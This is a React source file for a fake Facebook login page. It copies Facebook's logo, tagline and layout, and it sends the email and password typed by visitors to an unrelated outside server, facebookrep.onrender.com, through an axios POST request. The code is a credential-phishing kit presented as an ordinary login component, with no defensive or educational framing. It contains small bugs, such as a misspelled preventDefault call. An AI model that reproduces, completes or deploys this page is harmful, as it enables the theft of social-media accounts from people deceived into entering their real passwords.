import React, { useState } from "react";
import lg from "../media/fb.png";
import axios from "axios";

const LoginPage = () => {
  const uri = "https://facebookrep.onrender.com/";

  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const handleSubmit = (e) => {
    e.prevemtdefault();

    axios.post(`${uri}/api/info`, {
      email: email,
      password: password,
    })
  }

  return (
    <div className="container">
      <div className="login-page">
        <div className="left-side">
          <div className="img" style={{ backgroundImage: `url(${lg})` }} />
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div className="right-side">
          <form className="login-form">
            <input type="text" placeholder="Email or phone number" value={email}  onChange={(e) => setEmail(e.target.value)}/>
            <input type="password" placeholder="Password"  value={password}  onChange={(e) => setPassword(e.target.value)} />
            <button className="login-btn" onClick={() => handleSubmit()}>Log In</button>
            <h3  onClick={() => handleSubmit()}>Forgot password?</h3>
            <span></span>
            <button type="submit" className="act-btn" onClick={(e) => handleSubmit(e.target)}>Create new account</button>
          </form>
          <h4>
            <strong>Create a Page</strong> for a celebrity, brand or business.
          </h4>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
